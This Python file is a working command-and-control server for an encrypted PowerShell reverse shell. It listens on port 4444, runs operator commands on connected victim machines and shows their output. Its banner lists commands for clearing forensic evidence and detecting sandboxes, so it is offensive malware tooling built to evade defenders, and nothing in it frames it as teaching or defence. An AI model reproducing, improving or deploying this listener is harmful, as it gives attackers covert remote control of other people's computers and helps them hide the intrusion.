#!/usr/bin/env python3
import socket
import threading
from Crypto.Cipher import AES
import sys
import time

class AESCipher:
    def __init__(self):
        # Must match PowerShell key/IV
        self.key = bytes(range(16))  # 0-15
        self.iv = bytes(range(16, 32))  # 16-31
        
    def encrypt(self, raw):
        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
        raw = self._pad(raw)
        return cipher.encrypt(raw.encode('utf-8'))
    
    def decrypt(self, enc):
        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
        dec = cipher.decrypt(enc)
        return self._unpad(dec).decode('utf-8')
    
    def _pad(self, s):
        bs = AES.block_size
        return s + (bs - len(s) % bs) * chr(bs - len(s) % bs)
    
    def _unpad(self, s):
        return s[:-ord(s[len(s)-1:])]

class ReverseShellServer:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.aes = AESCipher()
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.active_sessions = []
        
    def start(self):
        try:
            self.sock.bind((self.host, self.port))
            self.sock.listen(5)
            
            print("=" * 60)
            print("  PowerShell Reverse Shell Listener")
            print("=" * 60)
            print(f"[*] Listening on {self.host}:{self.port}")
            print("[*] Waiting for connections...")
            print("=" * 60)
            print()
            
            while True:
                client, addr = self.sock.accept()
                print(f"\n[+] Connection from {addr[0]}:{addr[1]}")
                
                # Handle session in new thread
                thread = threading.Thread(target=self.handle_session, args=(client, addr))
                thread.daemon = True
                thread.start()
                self.active_sessions.append((client, addr, thread))
                
        except KeyboardInterrupt:
            print("\n\n[*] Shutting down...")
        except Exception as e:
            print(f"[!] Error: {e}")
        finally:
            self.sock.close()
    
    def handle_session(self, client, addr):
        try:
            # Initial beacon (unencrypted)
            beacon = client.recv(1024)
            print(f"[+] Beacon: {beacon.decode()}")
            print(f"[*] Shell session started with {addr[0]}")
            print()
            
            while True:
                # Get command from user
                try:
                    cmd = input(f"\033[92m{addr[0]}\033[0m> ")
                except (EOFError, KeyboardInterrupt):
                    cmd = "exit"
                    print()
                
                if cmd.strip() == '':
                    continue
                
                # Handle local exit
                if cmd.lower() in ['quit', 'q']:
                    print("[*] Closing session...")
                    self.send_encrypted(client, "exit")
                    break
                
                # Send command
                self.send_encrypted(client, cmd)
                
                # Receive response
                response = self.receive_encrypted(client)
                
                if response is None:
                    print(f"\n[!] Connection lost with {addr[0]}")
                    break
                
                if response == "[Session terminated]":
                    print(f"[*] Session terminated - waiting for reconnect...")
                    break
                
                if response == "[Permanent exit]":
                    print(f"[*] Client exited permanently")
                    break
                
                # Print output
                if response.strip():
                    print(response)
                
        except ConnectionResetError:
            print(f"\n[!] Connection reset by {addr[0]}:{addr[1]}")
        except BrokenPipeError:
            print(f"\n[!] Broken pipe with {addr[0]}:{addr[1]}")
        except Exception as e:
            print(f"\n[!] Session error: {e}")
        finally:
            try:
                client.close()
            except:
                pass
            print(f"[-] Connection closed: {addr[0]}:{addr[1]}")
            print("[*] Waiting for reconnection or new client...")
            print()
    
    def send_encrypted(self, client, data):
        try:
            encrypted = self.aes.encrypt(data)
            # Send length (4 bytes, little endian)
            client.send(len(encrypted).to_bytes(4, 'little'))
            # Send encrypted data
            client.send(encrypted)
        except Exception as e:
            print(f"[!] Send error: {e}")
            raise
    
    def receive_encrypted(self, client):
        try:
            # Get length (4 bytes)
            length_data = client.recv(4)
            if not length_data or len(length_data) != 4:
                return None
            
            length = int.from_bytes(length_data, 'little')
            
            # Validate length
            if length <= 0 or length > 1048576:  # 1MB max
                print(f"[!] Invalid length: {length}")
                return None
            
            # Get encrypted data
            encrypted = b''
            while len(encrypted) < length:
                remaining = length - len(encrypted)
                chunk = client.recv(min(4096, remaining))
                if not chunk:
                    print("[!] Connection closed during receive")
                    return None
                encrypted += chunk
            
            # Decrypt
            decrypted = self.aes.decrypt(encrypted)
            return decrypted
            
        except Exception as e:
            print(f"[!] Receive error: {e}")
            return None

def print_banner():
    banner = """
    ╔═══════════════════════════════════════════════════════╗
    ║                                                       ║
    ║       PowerShell Reverse Shell - C2 Listener         ║
    ║                                                       ║
    ║  Commands:                                            ║
    ║    exit / quit / q   - Close current session          ║
    ║    exit_permanent    - Kill client completely         ║
    ║    clear_tracks      - Clear forensic evidence        ║
    ║    check_sandbox     - Check if in sandbox/VM         ║
    ║                                                       ║
    ╚═══════════════════════════════════════════════════════╝
    """
    print(banner)

if __name__ == "__main__":
    print_banner()
    
    # Configuration
    HOST = "0.0.0.0"  # Listen on all interfaces
    PORT = 4444
    
    if len(sys.argv) > 1:
        try:
            PORT = int(sys.argv[1])
        except:
            print(f"[!] Invalid port: {sys.argv[1]}")
            sys.exit(1)
    
    print(f"[*] Configuration:")
    print(f"    Host: {HOST}")
    print(f"    Port: {PORT}")
    print()
    
    # Install dependencies check
    try:
        from Crypto.Cipher import AES
    except ImportError:
        print("[!] Missing dependency: pycryptodome")
        print("[*] Install with: pip install pycryptodome")
        sys.exit(1)
    
    server = ReverseShellServer(HOST, PORT)
    server.start()
